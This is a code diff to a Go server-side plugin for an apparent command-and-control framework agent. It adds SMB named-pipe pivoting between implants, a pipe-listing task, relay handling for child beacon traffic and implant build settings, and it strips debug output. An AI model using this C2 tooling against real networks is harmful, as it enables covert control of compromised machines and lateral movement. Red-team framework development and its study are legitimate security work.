@@ -67,30 +67,6 @@ func AgentGenerateProfile(agentConfig string, listenerWM string, listenerMap map
 
 	/// START CODE
 
-	fmt.Printf("=== AgentGenerateProfile ===\n")
-	fmt.Printf("agentConfig: %s\n", agentConfig)
-	fmt.Printf("listenerWM: %s\n", listenerWM)
-
-	// Print listenerMap detalhadamente
-	fmt.Printf("listenerMap (%d items):\n", len(listenerMap))
-	for key, value := range listenerMap {
-		switch v := value.(type) {
-		case string:
-			fmt.Printf("  [%s] = %s\n", key, v)
-		case int, int32, int64:
-			fmt.Printf("  [%s] = %d\n", key, v)
-		case bool:
-			fmt.Printf("  [%s] = %t\n", key, v)
-		case []byte:
-			fmt.Printf("  [%s] = []byte (length: %d)\n", key, len(v))
-		case map[string]any:
-			fmt.Printf("  [%s] = map[string]any (%d items)\n", key, len(v))
-		default:
-			fmt.Printf("  [%s] = %v (type: %T)\n", key, v, v)
-		}
-	}
-	fmt.Printf("============================\n")
-
 	/// END CODE
 	return nil, nil
 }
@@ -107,22 +83,37 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 		return nil, "", fmt.Errorf("failed to parse agentConfig: %v", err)
 	}
 
-	decoded, err := base64.StdEncoding.DecodeString(fmt.Sprint(listenerMap["uploaded_file"]))
-	if err != nil {
-		fmt.Printf("ERROR: failed decode base64: %v\n", err)
-		return nil, "", err
+	// Detect protocol from listener profile
+	protocol := ""
+	if p, ok := listenerMap["protocol"].(string); ok {
+		protocol = p
 	}
-	malleable_str := string(decoded)
-	fmt.Printf("DEBUG: Malleable profile decoded (%d bytes)\n", len(malleable_str))
+	isSMB := (protocol == "bind_smb")
+	fmt.Printf("DEBUG: Protocol: %s (isSMB: %v)\n", protocol, isSMB)
 
-	// Build malleable HTTP bytes
-	malleableBytes, callbackCount, err := BuildMalleableHTTPBytes(malleable_str)
-	if err != nil {
-		fmt.Printf("ERROR: Failed to build malleable HTTP bytes: %v\n", err)
-		return nil, "", err
+	var malleableBytes []byte
+	var callbackCount int
+
+	if !isSMB {
+		decoded, err := base64.StdEncoding.DecodeString(fmt.Sprint(listenerMap["uploaded_file"]))
+		if err != nil {
+			fmt.Printf("ERROR: failed decode base64: %v\n", err)
+			return nil, "", err
+		}
+		malleable_str := string(decoded)
+		fmt.Printf("DEBUG: Malleable profile decoded (%d bytes)\n", len(malleable_str))
+
+		// Build malleable HTTP bytes
+		malleableBytes, callbackCount, err = BuildMalleableHTTPBytes(malleable_str)
+		if err != nil {
+			fmt.Printf("ERROR: Failed to build malleable HTTP bytes: %v\n", err)
+			return nil, "", err
+		}
+		fmt.Printf("DEBUG: Malleable bytes generated (%d bytes)\n", len(malleableBytes))
+		fmt.Printf("DEBUG: HTTP Callback count: %d\n", callbackCount)
+	} else {
+		fmt.Println("DEBUG: SMB profile — skipping malleable HTTP parsing")
 	}
-	fmt.Printf("DEBUG: Malleable bytes generated (%d bytes)\n", len(malleableBytes))
-	fmt.Printf("DEBUG: HTTP Callback count: %d\n", callbackCount)
 
 	// Get working directory
 	wd, err := os.Getwd()
@@ -271,7 +262,7 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 	forkPipe := cfg.ForkPipe
 	forkPipe = strings.ReplaceAll(forkPipe, `\`, `\\`)
 	forkPipe = strings.ReplaceAll(forkPipe, `"`, `\"`)
-	forkPipeC := fmt.Sprintf("L\\\"%s\\\"", forkPipe)
+	forkPipeC := fmt.Sprintf("\"%s\"", forkPipe)
 
 	// Escape and format Spawnto
 	spawnto := cfg.Spawnto
@@ -307,10 +298,35 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 		fmt.Sprintf("KH_SPAWNTO_X64=%s", spawnto),
 
 		fmt.Sprintf("KH_BOF_HOOK_ENABLED=%d", bool_to_int(cfg.BofApiProxy)),
+	}
 
-		// Malleable HTTP bytes como array C entre aspas
-		fmt.Sprintf("HTTP_MALLEABLE_BYTES=\"%s\"", bytes_to_hexstr(malleableBytes)),
-		fmt.Sprintf("HTTP_CALLBACK_COUNT=%d", callbackCount),
+	// Profile-specific make variables
+	if isSMB {
+		// SMB profile: set PROFILE_C2 and pipe name, use dummy HTTP values
+		pipename := fmt.Sprint(listenerMap["pipename"])
+		if pipename == "<nil>" || pipename == "" {
+			pipename = "kharon_c2"
+		}
+		SmbPipeName = pipename // persist for CreateTask auto-resolution
+		// Build pipe path and convert to C byte array (avoids Make/Shell escaping issues)
+		pipePath := fmt.Sprintf("\\\\.\\pipe\\%s", pipename)
+		pipeBytes := append([]byte(pipePath), 0x00) // null-terminated
+		smbPipeHex := bytes_to_hexstr(pipeBytes)
+
+		makeVars = append(makeVars,
+			"PROFILE_C2=0x15",
+			fmt.Sprintf("SMB_PIPE_NAME=\"%s\"", smbPipeHex),
+			"HTTP_MALLEABLE_BYTES=\"{0x00}\"",
+			"HTTP_CALLBACK_COUNT=0",
+		)
+		fmt.Printf("DEBUG: SMB pipe path: %s\n", pipePath)
+		fmt.Printf("DEBUG: SMB pipe hex: %s\n", smbPipeHex)
+	} else {
+		// HTTP profile: malleable bytes
+		makeVars = append(makeVars,
+			fmt.Sprintf("HTTP_MALLEABLE_BYTES=\"%s\"", bytes_to_hexstr(malleableBytes)),
+			fmt.Sprintf("HTTP_CALLBACK_COUNT=%d", callbackCount),
+		)
 	}
 
 	// Guardrails
@@ -686,16 +702,9 @@ func CreateAgent(initialData []byte) (ax.AgentData, ax.ExtenderAgent, error) {
 		khcfg KharonData
 	)
 
-	fmt.Println("=== DEBUG RAW DATA ===")
-	fmt.Printf("Total bytes received: %d\n", len(initialData))
-	fmt.Printf("Hex dump:\n%s", hex.Dump(initialData))
-	fmt.Printf("\n")
-	fmt.Println("======================")
-
 	packer := CreatePacker(initialData)
 
 	command := packer.ParseInt8()
-	fmt.Printf("Command: 0x%x\n", command)
 	if command != 0xf1 {
 		return agent, ModuleObject.ext, errors.New("error agent checkin data")
 	}
@@ -890,19 +899,17 @@ func CreateAgent(initialData []byte) (ax.AgentData, ax.ExtenderAgent, error) {
 	fmt.Printf("VBS/HVCI Status: %v\n", khcfg.Machine.VbsHvci)
 
 	khcfg.Machine.DseStatus = uint32(packer.ParseInt32())
-	fmt.Printf("DSE Status: %v\n", khcfg.Machine.DseStatus)
 
 	khcfg.Machine.TestsignEnabled = packer.ParseInt32() != 0
 	fmt.Printf("Test Signing Enabled: %v\n", khcfg.Machine.TestsignEnabled)
 
 	khcfg.Machine.DebugmodeEnabled = packer.ParseInt32() != 0
-	fmt.Printf("Debug Mode Enabled: %v\n", khcfg.Machine.DebugmodeEnabled)
-
 	khcfg.Machine.SecurebootEnabled = packer.ParseInt32() != 0
-	fmt.Printf("Secure Boot Enabled: %v\n", khcfg.Machine.SecurebootEnabled)
 
 	key := packer.ParseBytes()
-	fmt.Printf("Session Key: %v\n", key)
+
+	// SMB pipe name (empty for HTTP beacons)
+	khcfg.PipeName = packer.ParseString()
 
 	process := ConvertCpToUTF8(khcfg.Session.ImgPath, int(khcfg.Session.Acp))
 	if strings.Contains(process, "\\") {
@@ -983,9 +990,17 @@ func PackPivotTasks(pivotId string, data []byte) ([]byte, error) {
 
 	/// START CODE
 
+	// TASK_PIVOT (int16=21) as command ID so Jobs::Create routes to Task::Pivot
+	// SubCmd int8=20 (Action::Pivot::Exchange) to trigger relay
+	array := []interface{}{TASK_PIVOT, int8(20), pivotId, len(data), data}
+	packData, err := PackArray(array)
+	if err != nil {
+		return nil, err
+	}
+
 	/// END CODE
 
-	return data, nil
+	return packData, nil
 }
 
 func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.TaskData, ax.ConsoleMessageData, error) {
@@ -1972,6 +1987,67 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 			array = []interface{}{TASK_POSTEX, POSTEX_ACTION_INJECT, len(bofData), bofData, len(bofArgs), bofArgs}
 		}
 
+	case "list_pipe":
+		filter := ""
+		if f, ok := args["filter"].(string); ok {
+			filter = f
+		}
+		bofData, err = LoadExtModule("src_core", "list_pipe", "x64")
+		if err != nil {
+			goto RET
+		}
+		bofParam, err = PackExtData(PackExtDataWChar(filter, agent.ACP))
+		if err != nil {
+			goto RET
+		}
+		array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, PIPE_LIST, len(bofParam), bofParam}
+		messageData.Text = fmt.Sprintf("Listing pipes matching: *%s*", filter)
+
+	case "link":
+		switch subcommand {
+		case "smb":
+			target, ok := args["target"].(string)
+			if !ok || target == "" {
+				err = errors.New("parameter 'target' is required")
+				goto RET
+			}
+			pipename, _ := args["pipename"].(string)
+			if pipename == "" {
+				pipename = SmbPipeName // auto-resolve from SMB listener config
+			}
+
+			// Build the full pipe path: \\target\pipe\pipename
+			fullPipePath := fmt.Sprintf("\\\\%s\\pipe\\%s", target, pipename)
+
+			// Action::Pivot::Link = 10 (beacon-side enum)
+			// CmdID is read as Int16 by Jobs::Create (line 34 of Jobs.cc)
+			array = []interface{}{TASK_PIVOT, int8(10), fullPipePath}
+
+			// Pre-generate TaskId so we can track which agent owns this link task.
+			// When the Link result comes back through a relayed PROFILE_SMB response,
+			// agentData is the outer HTTP parent — TaskOwnerMap lets us find the real parent.
+			taskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())
+			TaskOwnerMap[taskData.TaskId] = agent.Id
+
+			messageData.Text = fmt.Sprintf("Linking to SMB pipe: %s", fullPipePath)
+
+		default:
+			err = fmt.Errorf("unknown link subcommand: '%s'", subcommand)
+			goto RET
+		}
+
+	case "unlink":
+		agentID, ok := args["agent_id"].(string)
+		if !ok || agentID == "" {
+			err = errors.New("parameter 'agent_id' is required")
+			goto RET
+		}
+
+		// Action::Pivot::Unlink = 11 (beacon-side enum)
+		array = []interface{}{TASK_PIVOT, int8(11), agentID}
+
+		messageData.Text = fmt.Sprintf("Unlinking agent: %s", agentID)
+
 	default:
 		err = errors.New(fmt.Sprintf("Command '%v' not found", command))
 		goto RET
@@ -1982,10 +2058,7 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 		goto RET
 	}
 
-	fmt.Printf("tasking command: %s | sub command: %s\n", command, subcommand)
-
 RET:
-	fmt.Printf("err %v\n", err)
 
 	return taskData, messageData, err
 }
@@ -1999,19 +2072,45 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 
 	packer := CreatePacker(packedData)
 
-	// Print packedData
-	// fmt.Printf("=== PACKED DATA DEBUG ===\n")
-	// fmt.Printf("Total bytes: %d\n", len(packedData))
-	// fmt.Printf("Hex dump:\n%s", hex.Dump(packedData))
-	// fmt.Printf("Raw hex: %x\n", packedData)
-	// fmt.Printf("========================\n\n")
-
 	if false == packer.CheckPacker([]string{"int"}) {
 		return outTasks
 	}
 
-	taskCount := packer.ParseInt32()
+	// Check if data starts with MSG_QUICK (0x05) or MSG_OUT (0x07)
+	// Format: [1B type][36B raw TaskUUID][4B callbackType][4B+N string message]
+	if len(packedData) > 41 && (packedData[0] == 0x05 || packedData[0] == 0x07) {
+		msgType := packedData[0]
+		taskUUID := string(packedData[1:37]) // raw 36 bytes, NOT length-prefixed
+		_ = msgType
 
+		task := taskData
+		if len(taskUUID) >= 8 {
+			task.TaskId = taskUUID[:8]
+		}
+
+		// Read callback type (4 bytes BIG ENDIAN at offset 37)
+		remaining := packedData[37:]
+		if len(remaining) >= 4 {
+			_ = uint32(remaining[0])<<24 | uint32(remaining[1])<<16 | uint32(remaining[2])<<8 | uint32(remaining[3])
+			remaining = remaining[4:]
+
+			// Read message string (length-prefixed BIG ENDIAN: [4B len][chars])
+			if len(remaining) >= 4 {
+				msgLen := uint32(remaining[0])<<24 | uint32(remaining[1])<<16 | uint32(remaining[2])<<8 | uint32(remaining[3])
+				remaining = remaining[4:]
+				if uint32(len(remaining)) >= msgLen && msgLen > 0 {
+					output := string(remaining[:msgLen])
+					task.ClearText = ConvertCpToUTF8(output, agentData.ACP)
+					task.MessageType = MESSAGE_SUCCESS
+					task.Completed = false
+					outTasks = append(outTasks, task)
+				}
+			}
+		}
+		return outTasks
+	}
+
+	taskCount := packer.ParseInt32()
 	for taskIndex := uint(0); taskIndex < taskCount && packer.CheckPacker([]string{"int"}); taskIndex++ {
 		dataType := packer.ParseInt32()
 
@@ -2123,7 +2222,8 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 				return outTasks
 			}
 
-			cmd_packer := CreatePacker(packer.ParseBytes())
+			innerBytes := packer.ParseBytes()
+			cmd_packer := CreatePacker(innerBytes)
 			if cmd_packer.CheckPacker([]string{"array", "word"}) {
 
 				TaskUID := cmd_packer.ParseString()
@@ -2134,7 +2234,7 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 				task.TaskId = TaskUID[:8]
 
 				commandId := int16(cmd_packer.ParseInt16())
-				switch commandId {
+					switch commandId {
 
 				case TASK_JOB:
 					jobCount := cmd_packer.ParseInt32()
@@ -2806,12 +2906,6 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 								datalen := cmd_packer.ParseInt32()
 
 								fmt.Printf("COMMAND_TUNNEL_WRITE_TCP: DATA LEN: %d\n", datalen)
-								// Print packedData
-								fmt.Printf("=== PACKED DATA DEBUG ===\n")
-								fmt.Printf("Total bytes: %d\n", len(data))
-								fmt.Printf("Hex dump:\n%s", hex.Dump(data))
-								fmt.Printf("Raw hex: %x\n", data)
-								fmt.Printf("========================\n\n")
 								ts.TsTunnelConnectionData(int(channelID), data)
 							}
 						}
@@ -2835,6 +2929,60 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 								task.MessageType = MESSAGE_ERROR
 							} else {
 								task.MessageType = MESSAGE_SUCCESS
+							}
+						}
+					}
+
+				case TASK_PIVOT:
+					if cmd_packer.CheckPacker([]string{"byte"}) {
+						pivotSubCmd := int(cmd_packer.ParseInt8())
+
+						switch pivotSubCmd {
+						case 10: // Action::Pivot::Link
+							if cmd_packer.CheckPacker([]string{"int", "array"}) {
+								watermark := fmt.Sprintf("%08x", cmd_packer.ParseInt32())
+								childData := cmd_packer.ParseBytes()
+
+								if len(childData) > 0 {
+									childAgentId, err := ts.TsListenerInteralHandler(watermark, childData)
+									if err != nil {
+										task.Message = fmt.Sprintf("Link failed: %v", err)
+										task.MessageType = MESSAGE_ERROR
+									} else {
+										// Store mapping: serverAgentId → original UUID prefix from checkin blob.
+										// The beacon identifies children by SmbUUID (first 8 chars of checkin UUID),
+										// but CreateAgent assigns a random agent ID. Exchange needs the original.
+										if len(childData) >= 8 {
+											PivotUUIDMap[childAgentId] = string(childData[:8])
+										}
+
+										actualParent := agentData.Id
+										if owner, ok := TaskOwnerMap[task.TaskId]; ok {
+											actualParent = owner
+											delete(TaskOwnerMap, task.TaskId)
+										}
+										err = ts.TsPivotCreate(task.TaskId, actualParent, childAgentId, "", false)
+										_ = err
+
+										task.Message = fmt.Sprintf("----- New SMB pivot agent: [%s]===[%s] -----", actualParent, childAgentId)
+										task.MessageType = MESSAGE_SUCCESS
+									}
+								}
+							}
+						case 11: // Action::Pivot::Unlink
+							task.Message = "Child unlinked"
+							task.MessageType = MESSAGE_SUCCESS
+
+						case 20: // Action::Pivot::Exchange — child response relayed by parent
+							if cmd_packer.CheckPacker([]string{"int", "array"}) {
+								_ = cmd_packer.ParseInt32() // profileType
+								childResp := cmd_packer.ParseBytes()
+
+								if len(childResp) > 0 {
+									// childResp is encrypted PostJobs from the child beacon.
+									// Use InternalHandler which decrypts with the child's stored key.
+									_, _ = ts.TsListenerInteralHandler("c17a905a", childResp)
+								}
 							}
 						}
 					}
